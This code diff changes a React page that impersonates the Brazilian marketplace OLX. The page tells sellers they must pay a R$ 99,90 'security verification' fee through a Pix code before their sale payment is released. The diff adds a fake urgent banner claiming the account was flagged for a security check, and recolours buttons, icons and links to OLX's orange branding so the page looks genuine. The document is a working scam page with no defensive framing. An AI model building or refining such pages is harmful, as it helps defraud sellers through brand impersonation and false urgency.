@@ -104,6 +104,11 @@ export default function Home({ dados }: Props) {
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
       {/* Header OLX */}
+      {/* Banner de aviso */}
+      <div className="bg-red-600 text-white text-sm font-semibold py-2.5 px-4 text-center flex items-center justify-center gap-2">
+        🔒 Sua conta foi sinalizada para verificação de segurança. Regularize para não perder sua venda.
+      </div>
+
       <header className="border-b border-gray-200 bg-white py-3 shadow-sm">
         <div className="container flex items-center justify-between max-w-2xl mx-auto px-4">
           <img src="/logo.png" alt="OLX" className="h-14 w-auto" />
@@ -122,15 +127,15 @@ export default function Home({ dados }: Props) {
             {/* Linha de fundo */}
             <div className="absolute top-3.5 left-0 right-0 h-0.5 bg-gray-200 z-0" />
             {/* Linha preenchida (entre step 0 e 1) */}
-            <div className="absolute top-3.5 left-0 w-1/2 h-0.5 bg-purple-600 z-0" />
+            <div className="absolute top-3.5 left-0 w-1/2 h-0.5 bg-[#FF6E00] z-0" />
             {["Venda confirmada", "Verificação", "Pagamento liberado"].map((step, i) => (
               <div key={i} className="flex flex-col items-center flex-1 z-10">
                 <div className={`h-7 w-7 rounded-full flex items-center justify-center text-xs font-bold mb-1 ${
-                  i <= 1 ? "bg-purple-600 text-white" : "bg-gray-200 text-gray-400"
+                  i <= 1 ? "bg-[#FF6E00] text-white" : "bg-gray-200 text-gray-400"
                 }`}>
                   {i <= 1 ? "✓" : "3"}
                 </div>
-                <span className={`text-xs text-center leading-tight ${i <= 1 ? "text-purple-600 font-medium" : "text-gray-400"}`}>
+                <span className={`text-xs text-center leading-tight ${i <= 1 ? "text-[#FF6E00] font-medium" : "text-gray-400"}`}>
                   {step}
                 </span>
               </div>
@@ -165,7 +170,7 @@ export default function Home({ dados }: Props) {
                 <p className="text-gray-900 font-medium text-sm">Verificação de Segurança</p>
               </div>
               <div className="text-right">
-                <p className="text-xl font-bold text-purple-600">R$ 99,90</p>
+                <p className="text-xl font-bold text-[#FF6E00]">R$ 99,90</p>
                 <p className="text-xs text-gray-400">Pagamento único</p>
               </div>
             </div>
@@ -206,7 +211,7 @@ export default function Home({ dados }: Props) {
                       <input type="text" value={copyPaste} readOnly
                         className="flex-1 px-3 py-2 border border-gray-300 rounded-lg text-xs bg-gray-50 font-mono text-gray-700" />
                       <Button onClick={handleCopy}
-                        className={`flex items-center gap-1.5 px-3 ${copied ? "bg-green-600 hover:bg-green-700" : "bg-purple-600 hover:bg-purple-700"} text-white text-sm`}>
+                        className={`flex items-center gap-1.5 px-3 ${copied ? "bg-green-600 hover:bg-green-700" : "bg-[#FF6E00] hover:bg-[#e55f00]"} text-white text-sm`}>
                         {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                         {copied ? "Copiado!" : "Copiar"}
                       </Button>
@@ -225,7 +230,7 @@ export default function Home({ dados }: Props) {
         {/* Botão */}
         {!showQrCode && (
           <Button onClick={handlePayment} disabled={createDeposit.isPending}
-            className="w-full h-12 bg-purple-600 hover:bg-purple-700 text-white font-semibold rounded-xl">
+            className="w-full h-12 bg-[#FF6E00] hover:bg-[#e55f00] text-white font-semibold rounded-xl">
             {createDeposit.isPending ? (
               <div className="flex items-center gap-2">
                 <div className="h-4 w-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
@@ -252,8 +257,8 @@ export default function Home({ dados }: Props) {
               <span className="text-xs text-gray-500 text-center">Banco<br/>Central</span>
             </div>
             <div className="flex flex-col items-center gap-1">
-              <div className="h-10 w-10 bg-purple-100 rounded-full flex items-center justify-center">
-                <Lock className="h-5 w-5 text-purple-600" />
+              <div className="h-10 w-10 bg-orange-100 rounded-full flex items-center justify-center">
+                <Lock className="h-5 w-5 text-[#FF6E00]" />
               </div>
               <span className="text-xs text-gray-500 text-center">Dados<br/>Protegidos</span>
             </div>
@@ -270,7 +275,7 @@ export default function Home({ dados }: Props) {
         <div className="pt-4 border-t border-gray-200">
           <div className="grid grid-cols-3 gap-4 mb-6 text-center">
             {["Anunciar", "Ajuda", "Sobre a OLX", "Carreiras", "Imprensa", "Segurança"].map(link => (
-              <a key={link} href="#" className="text-xs text-gray-500 hover:text-purple-600">{link}</a>
+              <a key={link} href="#" className="text-xs text-gray-500 hover:text-[#FF6E00]">{link}</a>
             ))}
           </div>
 
